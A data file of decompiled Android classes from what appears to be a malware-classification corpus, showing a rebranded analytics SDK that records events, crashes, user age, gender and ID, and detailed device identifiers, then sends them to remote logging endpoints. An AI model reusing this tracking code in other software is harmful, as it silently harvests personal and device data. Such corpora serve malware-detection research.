onEventEnd""); return; } int e=e(context,""_tl"" + str + str2); if (e < 0) { Log.b(f.q,""event duration less than 0 in onEvnetEnd""); }  else { a(context,str,str2,e,1); } } public void a(Context context,String str,HashMap<String,String> hashMap,String str2){ if (context == null || TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) { Log.b(f.q,""invalid params in onKVEventBegin""); return; } if (a(hashMap)) { try { String str3=str + str2; this.f134c.a(str3,hashMap); this.f134c.a(str3); }  catch (Exception e) { Log.e(f.q,""exception in save k-v event begin inof"",e); } } } public void c(Context context,String str,String str2){ if (context == null || TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) { Log.b(f.q,""invalid params in onKVEventEnd""); return; } String str3=str + str2; int e=e(context,str3); if (e < 0) { Log.b(f.q,""event duration less than 0 in onEvnetEnd""); }  else { a(context,str,this.f134c.c(str3),e); } } boolean a(String str,int i){ int length; return (str == null || (length=str.getBytes().length) == 0 || length > i) ? false : true; } boolean a(Map<String,String> map){ if (map == null || map.isEmpty()) { Log.b(f.q,""map is null or empty in onEvent""); return false; } for (Map.Entry<String,String> entry : map.entrySet()) { if (!a(entry.getKey(),128) || !a(entry.getValue(),256)) { Log.b(f.q,String.format(""invalid key-<%s> or value-<%s> "",entry.getKey(),entry.getValue())); return false; } } return true; } public void d(Context context){ try { j(context); }  catch (Exception e) { e.printStackTrace(); } } @Override public void b(Context context,Throwable th){ try { this.f134c.a(new com.seleuco.analytics.a.d(th)); j(context); }  catch (Exception e) { Log.a(f.q,""Exception in onAppCrash"",e); } } } public final class b implements Runnable {   private Context b;   b(  Context context){     this.b=context.getApplicationContext();   }   @Override public void run(){     try { synchronized (d.this.b) {         d.this.d(this.b);       }     }  catch (    Error e) {       Log.b(f.q,""Error : "" + e.getMessage());       try {         i.j(this.b);       }  catch (      Exception e2) {         e2.printStackTrace();       }     } catch (    Exception e3) {       Log.b(f.q,""Exception occurred in ReportMessageHandler"",e3);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\c.code","public class c {   private com.seleuco.analytics.a.i a=new com.seleuco.analytics.a.i();   private HashMap<String,j> b=new HashMap<>();   private HashMap<String,HashMap<String,String>> f133c=new HashMap<>();   private int d=10;   public void a(  int i){     this.d=i;   }   public int a(){     return this.a.b();   }   public boolean b(){     return this.a.b() > this.d;   }   public void a(  String str){     if (this.b.containsKey(str)) {       this.b.get(str).a(Long.valueOf(System.currentTimeMillis()));       return;     }     j jVar=new j(str);     jVar.a(Long.valueOf(System.currentTimeMillis()));     this.b.put(str,jVar);   }   public long b(  String str){     if (this.b.containsKey(str)) {       return this.b.get(str).a().longValue();     }     return -1L;   }   public void a(  String str,  HashMap<String,String> hashMap){     if (!this.f133c.containsKey(str)) {       this.f133c.put(str,hashMap);     }   }   public HashMap<String,String> c(  String str){     return (!this.b.containsKey(str) || this.b.get(str).b() <= 0) ? this.f133c.remove(str) : this.f133c.get(str);   }   public synchronized void a(  String str,  String str2,  String str3,  long j,  int i){     this.a.a(new com.seleuco.analytics.a.e(str,str2,str3,i,j));   }   public synchronized void a(  String str,  String str2,  HashMap<String,String> hashMap,  long j){     this.a.a(str,new com.seleuco.analytics.a.a(str2,hashMap,j));   }   public synchronized void a(  com.seleuco.analytics.a.d dVar){     this.a.a(dVar);   }   public synchronized void a(  com.seleuco.analytics.a.h hVar){     this.a.a(hVar);   }   public synchronized void a(  m mVar){     this.a.a(mVar);   }   public boolean c(){     return this.a.a();   }   public void a(  Context context){     if (a() > 0) {       String d=com.seleuco.common.b.d(context);       JSONObject a=i.a(context,d);       com.seleuco.analytics.a.i iVar=new com.seleuco.analytics.a.i();       if (a != null) {         iVar.a(a);       } synchronized (this) {         iVar.a(this.a);         this.a.c();       }       i.a(context,iVar,d);     }   }   public void b(  Context context){     JSONObject a=i.a(context,com.seleuco.common.b.d(context));     if (a != null && a.length() != 0) {       com.seleuco.analytics.a.i iVar=new com.seleuco.analytics.a.i();       iVar.a(a); synchronized (this) {         this.a.a(iVar);       }     }   }   public synchronized JSONObject d(){     JSONObject jSONObject;     try {       jSONObject=new JSONObject();       this.a.b(jSONObject);     }  catch (    Exception e) {       Log.d(f.q,"""",e);       jSONObject=null;     }     return jSONObject;   }   public synchronized void e(){     this.a.c();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@545e06ab"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\e.code","class e extends JSONObject {   final d a;   public e(  d dVar) throws Exception {     this.a=dVar;     this.a.d.b(this);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\f.code","public class f {   public static final String A=""seleuco_net_report_policy"";   public static final String B=""seleuco_net_report_interval"";   public static final String C=""seleuco_last_config_time"";   public static final String D=""seleuco_local_report_policy"";   public static final String E=""seleuco_local_report_interval"";   public static final String F=""last_report_time"";   public static final String G=""report_interval"";   public static final String H=""req_time"";   public static final String a=""Android"";   public static final String b=""Android"";   public static final String f135c=""4.6.2"";   static final int e=8;   static final int f=10;   static final String n=""last_send_time"";   static final String o=""cache_version"";   public static final String q=""GameControl"";   static final String u=""age"";   static final String v=""gender"";   static final String w=""user_id"";   static final String x=""id_source"";   static final String y=""traffics_up"";   static final String z=""traffics_down"";   static long d=30000;   public static long g=86400000;   public static int h=10000;   public static boolean i=true;   public static boolean j=true;   static boolean k=true;   static boolean l=true;   static boolean m=true;   static final Object p=new Object();   static final String[] r={""http://alog.umeng.com/app_logs"",""http://alog.umeng.co/app_logs""};   public static final String[] s={""http://oc.umeng.com/check_config_update"",""http://oc.umeng.co/check_config_update""};   static boolean t=true; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\g.code","class g {   private static final String a=g.class.getName();   g(){   }   public static java.lang.String a(  android.content.Context r5){     throw new UnsupportedOperationException(""Method not decompiled: com.seleuco.analytics.g.a(android.content.Context):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\GameControl.code","public class GameControl {   private static final b a=new b();   private static final com.seleuco.analytics.onlineconfig.a b=new com.seleuco.analytics.onlineconfig.a(); static {     b.a(a);   }   public static void setAutoLocation(  boolean z){     f.i=z;   }   public static void setWrapper(  String str,  String str2){     a.a(str,str2);   }   public static void setSessionContinueMillis(  long j){     f.d=j;   }   public static void setEnableEventBuffer(  boolean z){     f.m=z;   }   public static void setOnlineConfigureListener(  SeleucoConfigureListener seleucoConfigureListener){     b.a(seleucoConfigureListener);   }   public static b a(){     return a;   }   public static void setOpenGLContext(  GL10 gl10){     if (gl10 != null) {       String[] a2=com.seleuco.common.b.a(gl10);       if (a2.length == 2) {         a.a=a2[0];         a.b=a2[1];       }     }   }   public static void openActivityDurationTrack(  boolean z){     f.j=z;   }   public static void setDebugMode(  boolean z){     Log.LOG=z;   }   public static void setDefaultReportPolicy(  Context context,  int i){     Log.e(f.q,""æ­¤æ–¹æ³•ä¸�å†�ä½¿ç”¨ï¼Œè¯·ä½¿ç”¨åœ¨çº¿å�‚æ•°é…�ç½®ï¼Œå�‘é€�ç­–ç•¥"");   }   public static void onPause(  Context context){     a.a(context);   }   public static void onResume(  Context context){     a.b(context);   }   public static void onResume(  Context context,  String str,  String str2){     if (str == null || str.length() == 0) {       Log.b(f.q,""unexpected empty appkey in onResume"");       return;     }     a.k=str;     a.j=str2;     a.b(context);   }   public static void onError(  Context context){   }   public static void onError(  Context context,  String str){     if (str == null || str.length() == 0) {       Log.b(f.q,""unexpected empty appkey in onError"");     }  else {       a.k=str;       onError(context);     }   }   public static void reportError(  Context context,  String str){     a.a(context,str);   }   public static void reportError(  Context context,  Throwable th){     a.a(context,th);   }   public static void flush(  Context context){     a.c(context);   }   public static void onEvent(  Context context,  String str){     a.a(context,str,null,-1L,1);   }   public static void onEvent(  Context context,  String str,  int i){     a.a(context,str,null,-1L,i);   }   public static void onEvent(  Context context,  String str,  String str2,  int i){     if (TextUtils.isEmpty(str2)) {       Log.a(f.q,""label is null or empty"");     }  else {       a.a(context,str,str2,-1L,i);     }   }   public static void onEvent(  Context context,  String str,  String str2){     if (TextUtils.isEmpty(str2)) {       Log.a(f.q,""label is null or empty"");     }  else {       a.a(context,str,str2,-1L,1);     }   }   public static void onEvent(  Context context,  String str,  HashMap<String,String> hashMap){     a.a(context,str,hashMap,-1L);   }   public static void onEventDuration(  Context context,  String str,  long j){     if (j <= 0) {       Log.a(f.q,""duration is not valid in onEventDuration"");     }  else {       a.a(context,str,null,j,1);     }   }   public static void onEventDuration(  Context context,  String str,  String str2,  long j){     if (TextUtils.isEmpty(str2)) {       Log.a(f.q,""label is null or empty"");     }  else     if (j <= 0) {       Log.a(f.q,""duration is not valid in onEventDuration"");     }  else {       a.a(context,str,str2,j,1);     }   }   public static void onEventDuration(  Context context,  String str,  HashMap<String,String> hashMap,  long j){     if (j <= 0) {       Log.a(f.q,""duration is not valid in onEventDuration"");     }  else {       a.a(context,str,hashMap,j);     }   }   public static void onEventBegin(  Context context,  String str){     a.b(context,str);   }   public static void onEventEnd(  Context context,  String str){     a.c(context,str);   }   public static void onEventBegin(  Context context,  String str,  String str2){     a.a(context,str,str2);   }   public static void onEventEnd(  Context context,  String str,  String str2){     a.b(context,str,str2);   }   public static void onKVEventBegin(  Context context,  String str,  HashMap<String,String> hashMap,  String str2){     a.a(context,str,hashMap,str2);   }   public static void onKVEventEnd(  Context context,  String str,  String str2){     a.c(context,str,str2);   }   public static String getConfigParams(  Context context,  String str){     return i.b(context).getString(str,"""");   }   public static void updateOnlineConfig(  Context context,  String str,  String str2){     if (str == null || str.length() == 0) {       Log.b(f.q,""unexpected empty appkey in onResume"");     }  else {       b.a(context,str,str2);     }   }   public static void updateOnlineConfig(  Context context){     b.a(context);   }   public void setGender(  Context context,  Gender gender){     int i=0;     SharedPreferences a2=i.a(context); switch (gender) { case Male:       i=1;     break; case Female:   i=2; break; } a2.edit().putInt(""gender"",i).commit(); } public void setAge(Context context,int i){ SharedPreferences a2=i.a(context); if (i < 0 || i > 200) { Log.a(f.q,""not a valid age!""); }  else { a2.edit().putInt(""age"",i).commit(); } } public void setUserID(Context context,String str,String str2){ SharedPreferences a2=i.a(context); if (TextUtils.isEmpty(str)) { Log.a(f.q,""userID is null or empty""); return; } a2.edit().putString(""user_id"",str).commit(); if (TextUtils.isEmpty(str2)) { Log.a(f.q,""id source is null or empty""); }  else { a2.edit().putString(""id_source"",str2).commit(); } } public static void onKillProcess(Context context){ a.d(context); } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\GameControlJSInterface.code","public class GameControlJSInterface {   private Context a;   public GameControlJSInterface(  Context context,  WebView webView){     this.a=context;     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebChromeClient(new a(null));   }   public GameControlJSInterface(  Context context,  WebView webView,  WebChromeClient webChromeClient){     this.a=context;     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebChromeClient(new a(webChromeClient));   } final class a extends WebChromeClient {     WebChromeClient a;     private final String f122c=""ekv"";     private final String d=""event"";     public a(    WebChromeClient webChromeClient){       this.a=null;       if (webChromeClient == null) {         this.a=new WebChromeClient();       }  else {         this.a=webChromeClient;       }     }     @Override public boolean onJsPrompt(    WebView webView,    String str,    String str2,    String str3,    JsPromptResult jsPromptResult){       if (""ekv"".equals(str2)) {         try {           JSONObject jSONObject=new JSONObject(str3);           HashMap<String,String> hashMap=new HashMap<>();           String str4=(String)jSONObject.remove(""id"");           int intValue=jSONObject.isNull(""duration"") ? 0 : ((Integer)jSONObject.remove(""duration"")).intValue();           Iterator<String> keys=jSONObject.keys();           while (keys.hasNext()) {             String next=keys.next();             hashMap.put(next,jSONObject.getString(next));           }           GameControl.a().a(GameControlJSInterface.this.a,str4,hashMap,intValue);         }  catch (        Exception e) {           e.printStackTrace();         }       }  else       if (""event"".equals(str2)) {         try {           JSONObject jSONObject2=new JSONObject(str3);           String optString=jSONObject2.optString(""label"");           if ("""".equals(optString)) {             optString=null;           }           GameControl.a().a(GameControlJSInterface.this.a,jSONObject2.getString(""tag""),optString,jSONObject2.optInt(""duration""),1);         }  catch (        Exception e2) {         }       }  else {         return this.a.onJsPrompt(webView,str,str2,str3,jsPromptResult);       }       jsPromptResult.confirm();       return true;     }     @Override public void onCloseWindow(    WebView webView){       this.a.onCloseWindow(webView);     }     @Override public boolean onCreateWindow(    WebView webView,    boolean z,    boolean z2,    Message message){       return this.a.onCreateWindow(webView,z,z2,message);     }     @Override public boolean onJsAlert(    WebView webView,    String str,    String str2,    JsResult jsResult){       return this.a.onJsAlert(webView,str,str2,jsResult);     }     @Override public boolean onJsBeforeUnload(    WebView webView,    String str,    String str2,    JsResult jsResult){       return this.a.onJsBeforeUnload(webView,str,str2,jsResult);     }     @Override public boolean onJsConfirm(    WebView webView,    String str,    String str2,    JsResult jsResult){       return this.a.onJsConfirm(webView,str,str2,jsResult);     }     @Override public void onProgressChanged(    WebView webView,    int i){       this.a.onProgressChanged(webView,i);     }     @Override public void onReceivedIcon(    WebView webView,    Bitmap bitmap){       this.a.onReceivedIcon(webView,bitmap);     }     @Override public void onReceivedTitle(    WebView webView,    String str){       this.a.onReceivedTitle(webView,str);     }     @Override public void onRequestFocus(    WebView webView){       this.a.onRequestFocus(webView);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\h.code","interface h {   void b(  Context context,  Throwable th); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\i.code","public final class i {   static long a=1209600000;   static long b=2097152;   private static final String f136c=""cache_version"";   private static final String d=""error"";   private static final String e=""mobclick_agent_user_"";   private static final String f=""mobclick_agent_online_setting_"";   private static final String g=""mobclick_agent_header_"";   private static final String h=""mobclick_agent_update_"";   private static final String i=""mobclick_agent_state_"";   private static final String j=""mobclick_agent_cached_"";   public static SharedPreferences a(  Context context){     return context.getSharedPreferences(e + context.getPackageName(),0);   }   public static SharedPreferences b(  Context context){     return context.getSharedPreferences(f + context.getPackageName(),0);   }   public static SharedPreferences c(  Context context){     return context.getSharedPreferences(g + context.getPackageName(),0);   }   static SharedPreferences d(  Context context){     return context.getSharedPreferences(h + context.getPackageName(),0);   }   public static SharedPreferences e(  Context context){     return context.getSharedPreferences(i + context.getPackageName(),0);   }   static String f(  Context context){     return g + context.getPackageName();   }   static String g(  Context context){     return j + context.getPackageName();   }   static JSONObject h(  Context context){     JSONObject jSONObject=new JSONObject();     SharedPreferences a2=a(context);     try {       if (a2.getInt(""gender"",-1) != -1) {         jSONObject.put(""sex"",a2.getInt(""gender"",-1));       }       if (a2.getInt(""age"",-1) != -1) {         jSONObject.put(""age"",a2.getInt(""age"",-1));       }       if (!"""".equals(a2.getString(""user_id"",""""))) {         jSONObject.put(""id"",a2.getString(""user_id"",""""));       }       if (!"""".equals(a2.getString(""id_source"",""""))) {         jSONObject.put(""url"",URLEncoder.encode(a2.getString(""id_source"",""""),com.seleuco.common.util.e.f));       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     if (jSONObject.length() > 0) {       return jSONObject;     }     return null;   }   public static int[] i(  Context context){     SharedPreferences b2=b(context);     int[] iArr=new int[2];     if (b2.getInt(f.A,-1) != -1) {       iArr[0]=b2.getInt(f.A,1);       iArr[1]=(int)b2.getLong(f.B,f.h);     }  else {       iArr[0]=b2.getInt(f.D,1);       iArr[1]=(int)b2.getLong(f.E,f.h);     }     return iArr;   }   static boolean a(  File file){     return file.exists() && file.length() > b;   }   public static JSONObject a(  Context context,  String str){     JSONObject jSONObject=null;     String g2=g(context);     try {       File file=new File(context.getFilesDir(),g2);       if (a(file)) {         file.delete();       }  else {         FileInputStream openFileInput=context.openFileInput(g2);         try {           try {             try {               JSONObject jSONObject2=new JSONObject(a(openFileInput));               if (!jSONObject2.optString(f136c).equals(str)) {                 jSONObject2.remove(d);               }               jSONObject2.remove(f136c);               int length=jSONObject2.length();               openFileInput=length;               if (length != 0) {                 jSONObject=jSONObject2;                 openFileInput=length;               }             }  catch (            JSONException e2) {               j(context);               e2.printStackTrace();               openFileInput=openFileInput;             }           }   finally {             openFileInput.close();           }         }  catch (        Exception e3) {           e3.printStackTrace();           openFileInput.close();           openFileInput=openFileInput;         }       }     }  catch (    FileNotFoundException e4) {     } catch (    IOException e5) {     } catch (    Throwable th) {     }     return jSONObject;   }   static String a(  InputStream inputStream) throws IOException {     InputStreamReader inputStreamReader=new InputStreamReader(inputStream);     char[] cArr=new char[1024];     StringWriter stringWriter=new StringWriter();     while (true) {       int read=inputStreamReader.read(cArr);       if (-1 != read) {         stringWriter.write(cArr,0,read);       }  else {         return stringWriter.toString();       }     }   }   static void a(  Context context,  JSONObject jSONObject,  String str) throws Exception {     if (jSONObject != null) {       String g2=g(context);       jSONObject.put(f136c,str);       FileOutputStream openFileOutput=context.openFileOutput(g2,0);       openFileOutput.write(jSONObject.toString().getBytes());       openFileOutput.flush();       openFileOutput.close();       Log.c(f.q,""cache buffer success"");     }   }   public static void a(  Context context,  com.seleuco.analytics.a.g gVar,  String str){     if (gVar != null) {       try {         JSONObject jSONObject=new JSONObject();         gVar.b(jSONObject);         a(context,jSONObject,str);       }  catch (      Exception e2) {         Log.b(f.q,""cache message error"",e2);       }     }   }   public static void b(  Context context,  JSONObject jSONObject,  String str){     if (jSONObject != null) {       try {         a(context,jSONObject.optJSONObject(""body""),str);       }  catch (      Exception e2) {         Log.b(f.q,""cache message error"",e2);       }     }   }   public static void j(  Context context){     context.deleteFile(f(context));     context.deleteFile(g(context));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\j.code","public class j {   private static final int b=4;   private Vector<Long> a;   private String f137c;   public j(  String str){     this.a=new Vector<>(4);     this.f137c=str;   }   public j(  String str,  int i){     this.f137c=str;     if (i < 0) {       this.a=new Vector<>(4);     }  else {       this.a=new Vector<>(i);     }   }   public void a(  Long l){     while (this.a.size() >= 4) {       this.a.remove(0);     }     this.a.add(l);   }   public Long a(){     int size=this.a.size();     if (size <= 0) {       return -1L;     }     return this.a.remove(size - 1);   }   public int b(){     return this.a.size();   }   public String toString(){     int size=this.a.size();     if (size <= 0) {       return null;     }     StringBuffer stringBuffer=new StringBuffer(4);     for (int i=0; i < size; i++) {       stringBuffer.append(this.a.get(i));       if (i != size - 1) {         stringBuffer.append("","");       }     }     this.a.clear();     return stringBuffer.toString();   }   public static j a(  Context context,  String str){     return a(str,i.e(context).getString(str,null));   }   public static j a(  String str,  String str2){     j jVar=new j(str);     if (!TextUtils.isEmpty(str2)) {       for (      String str3 : str2.split("","")) {         String trim=str3.trim();         if (!TextUtils.isEmpty(trim)) {           Long.valueOf(-1L);           try {             jVar.a(Long.valueOf(Long.parseLong(trim)));           }  catch (          Exception e) {           }         }       }     }     return jVar;   }   public void a(  Context context){     String jVar=toString();     SharedPreferences.Editor edit=i.e(context).edit();     if (TextUtils.isEmpty(jVar)) {       edit.remove(this.f137c).commit();     }  else {       edit.putString(this.f137c,jVar).commit();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\ReportPolicy.code","public class ReportPolicy {   public static final int BATCH_AT_LAUNCH=1;   public static final int BATCH_BY_INTERVAL=6;   public static final int DAILY=4;   static final int a=0;   static final int b=2;   static final int f123c=3;   static final int d=5; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\a.code","public class a implements g {   public final HashMap<String,String> a;   public String b;   public long f125c;   public long d;   private final String e;   private final String f;   private final String g;   public a(){     this.f125c=0L;     this.d=0L;     this.e=""id"";     this.f=""ts"";     this.g=""du"";     this.a=new HashMap<>();   }   public a(  String str,  HashMap<String,String> hashMap,  long j){     this.f125c=0L;     this.d=0L;     this.e=""id"";     this.f=""ts"";     this.g=""du"";     this.b=str;     this.a=a(hashMap);     this.d=j;     this.f125c=b();   }   private HashMap<String,String> a(  HashMap<String,String> hashMap){     if (hashMap.size() > 10) {       int size=hashMap.size() - 10;       String[] strArr=new String[size];       int i=0;       for (      String str : hashMap.keySet()) {         if (i >= size) {           break;         }         strArr[i]=str;         i++;       }       for (      String str2 : strArr) {         hashMap.remove(str2);       }     }     return hashMap;   }   private long b(){     return System.currentTimeMillis() / 1000;   }   private void c(  JSONObject jSONObject) throws JSONException {     for (    Map.Entry<String,String> entry : this.a.entrySet()) {       jSONObject.put(entry.getKey(),entry.getValue());     }   }   private void d(  JSONObject jSONObject) throws Exception {     jSONObject.remove(""id"");     jSONObject.remove(""ts"");     jSONObject.remove(""du"");     Iterator<String> keys=jSONObject.keys();     while (keys.hasNext()) {       String next=keys.next();       this.a.put(next,jSONObject.getString(next));     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         this.b=jSONObject.getString(""id"");         this.f125c=jSONObject.getLong(""ts"");         if (jSONObject.has(""du"")) {           this.d=jSONObject.getLong(""du"");         }         d(jSONObject);       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws JSONException {     try {       jSONObject.put(""id"",this.b);       jSONObject.put(""ts"",this.f125c);       if (this.d > 0) {         jSONObject.put(""du"",this.d);       }       c(jSONObject);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public boolean a(){     if (this.b == null || this.f125c <= 0) {       Log.b(com.seleuco.analytics.f.q,""mId or mTs is not initialized"");       return false;     }     if (this.a.isEmpty()) {       Log.b(com.seleuco.analytics.f.q,""mCustomKV is not initialized"");       return false;     }     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\b.code","public class b implements g {   public String a;   public ArrayList<a> b=new ArrayList<>();   public b(){   }   public b(  String str,  a aVar){     this.a=str;     this.b.add(aVar);   }   private void c(  JSONObject jSONObject) throws Exception {     if (jSONObject.length() != 0) {       this.a=jSONObject.keys().next();     }   }   private void d(  JSONObject jSONObject) throws Exception {     if (this.a != null) {       JSONArray jSONArray=jSONObject.getJSONArray(this.a);       for (int i=0; i < jSONArray.length(); i++) {         a aVar=new a();         aVar.a(jSONArray.getJSONObject(i));         this.b.add(aVar);       }     }   }   @Override public void a(  JSONObject jSONObject) throws Exception {     if (jSONObject != null) {       c(jSONObject);       d(jSONObject);     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     JSONArray jSONArray=new JSONArray();     Iterator<a> it=this.b.iterator();     while (it.hasNext()) {       jSONArray.put(new c(this,it.next()));     }     jSONObject.put(this.a,jSONArray);   }   @Override public boolean a(){     if (this.a == null || this.b.size() == 0) {       return false;     }     Iterator<a> it=this.b.iterator();     while (it.hasNext()) {       if (!it.next().a()) {         return false;       }     }     return true;   }   public void a(  b bVar){     this.b.addAll(bVar.b);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\c.code","class c extends JSONObject {   final a a;   final b b;   public c(  b bVar,  a aVar) throws JSONException {     this.b=bVar;     this.a=aVar;     this.a.b(this);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\d.code","public class d extends n implements g {   public String a;   private final String b=""context"";   public d(){   }   public d(  String str){     this.a=str;   }   public d(  Throwable th){     this.a=a(th);   }   private String a(  Throwable th){     String str=null;     if (th == null) {       return null;     }     try {       StringWriter stringWriter=new StringWriter();       PrintWriter printWriter=new PrintWriter(stringWriter);       th.printStackTrace(printWriter);       for (Throwable cause=th.getCause(); cause != null; cause=cause.getCause()) {         cause.printStackTrace(printWriter);       }       str=stringWriter.toString();       printWriter.close();       stringWriter.close();       return str;     }  catch (    Exception e) {       e.printStackTrace();       return str;     }   }   @Override public boolean a(){     if (this.a != null) {       return super.a();     }     Log.b(com.seleuco.analytics.f.q,""mContent is not initialized"");     return false;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         this.g=jSONObject.getString(""date"");         this.h=jSONObject.getString(""time"");         this.a=jSONObject.getString(""context"");       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(""date"",this.g);     jSONObject.put(""time"",this.h);     jSONObject.put(""context"",this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\e.code","public class e extends l implements g {   public String a;   public String b;   public int f126c;   public long d;   private final String k=""tag"";   private final String l=""label"";   private final String m=""acc"";   private final String n=""du"";   public e(){   }   public e(  String str,  String str2,  String str3,  int i,  long j){     this.e=str;     this.a=str2;     this.b=str3;     this.f126c=i;     this.d=j;   }   @Override public boolean a(){     if (this.a == null) {       Log.b(com.seleuco.analytics.f.q,""mTag is not initilized"");       return false;     }     if (this.f126c <= 0 || this.f126c > 10000) {       Log.b(com.seleuco.analytics.f.q,""mAcc is invalid : "" + this.f126c);       return false;     }     return super.a();   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         super.a(jSONObject);         this.a=jSONObject.getString(""tag"");         if (jSONObject.has(""label"")) {           this.b=jSONObject.getString(""label"");         }         this.f126c=jSONObject.getInt(""acc"");         if (jSONObject.has(""du"")) {           this.d=jSONObject.getLong(""du"");         }       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(""tag"",this.a);     jSONObject.put(""acc"",this.f126c);     if (this.b != null) {       jSONObject.put(""label"",this.b);     }     if (this.d > 0) {       jSONObject.put(""du"",this.d);     }     super.b(jSONObject);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\f.code","public class f implements g {   public String A;   public String B;   public String C;   public String D;   public String E;   public String F;   public String a;   public String b;   public String f127c;   public String d;   public String e;   public long f;   public String g;   public String h;   public String i;   public String j;   public String k;   public String l;   public String m;   public String n;   public String o;   public long p;   public String q;   public String r;   public String s;   public String t;   public String u;   public String v;   public String w;   public String x;   public int y;   public String z;   private final String G=com.seleuco.common.a.g;   private final String H=com.seleuco.common.a.d;   private final String I=""device_id"";   private final String J=com.seleuco.common.a.e;   private final String K=""mc"";   private final String L=com.seleuco.analytics.f.H;   private final String M=""device_model"";   private final String N=""os"";   private final String O=""os_version"";   private final String P=""resolution"";   private final String Q=""cpu"";   private final String R=""gpu_vender"";   private final String S=""gpu_renderer"";   private final String T=""device_board"";   private final String U=""device_brand"";   private final String V=""device_manutime"";   private final String W=""device_manufacturer"";   private final String X=""device_manuid"";   private final String Y=""device_name"";   private final String Z=""app_version"";   private final String aa=com.seleuco.common.a.f;   private final String ab=""package_name"";   private final String ac=""sdk_type"";   private final String ad=com.seleuco.common.a.h;   private final String ae=""timezone"";   private final String af=""country"";   private final String ag=""language"";   private final String ah=""access"";   private final String ai=""access_subtype"";   private final String aj=""carrier"";   private final String ak=""wrapper_type"";   private final String al=""wrapper_version"";   public f(){   }   public f(  String str,  String str2){     this.a=str;     this.b=str2;   }   private void c(  JSONObject jSONObject) throws Exception {     this.a=jSONObject.getString(com.seleuco.common.a.g);     this.f127c=jSONObject.getString(""device_id"");     this.d=jSONObject.getString(com.seleuco.common.a.e);     if (jSONObject.has(""mc"")) {       this.e=jSONObject.getString(""mc"");     }     if (jSONObject.has(com.seleuco.common.a.d)) {       this.b=jSONObject.getString(com.seleuco.common.a.d);     }     if (jSONObject.has(com.seleuco.analytics.f.H)) {       this.f=jSONObject.getLong(com.seleuco.analytics.f.H);     }   }   private void d(  JSONObject jSONObject) throws Exception {     this.g=jSONObject.has(""device_model"") ? jSONObject.getString(""device_model"") : null;     this.h=jSONObject.has(""os"") ? jSONObject.getString(""os"") : null;     this.i=jSONObject.has(""os_version"") ? jSONObject.getString(""os_version"") : null;     this.j=jSONObject.has(""resolution"") ? jSONObject.getString(""resolution"") : null;     this.k=jSONObject.has(""cpu"") ? jSONObject.getString(""cpu"") : null;     this.l=jSONObject.has(""gpu_vender"") ? jSONObject.getString(""gpu_vender"") : null;     this.m=jSONObject.has(""gpu_renderer"") ? jSONObject.getString(""gpu_renderer"") : null;     this.n=jSONObject.has(""device_board"") ? jSONObject.getString(""device_board"") : null;     this.o=jSONObject.has(""device_brand"") ? jSONObject.getString(""device_brand"") : null;     this.p=jSONObject.has(""device_manutime"") ? jSONObject.getLong(""device_manutime"") : 0L;     this.q=jSONObject.has(""device_manufacturer"") ? jSONObject.getString(""device_manufacturer"") : null;     this.r=jSONObject.has(""device_manuid"") ? jSONObject.getString(""device_manuid"") : null;     this.s=jSONObject.has(""device_name"") ? jSONObject.getString(""device_name"") : null;   }   private void e(  JSONObject 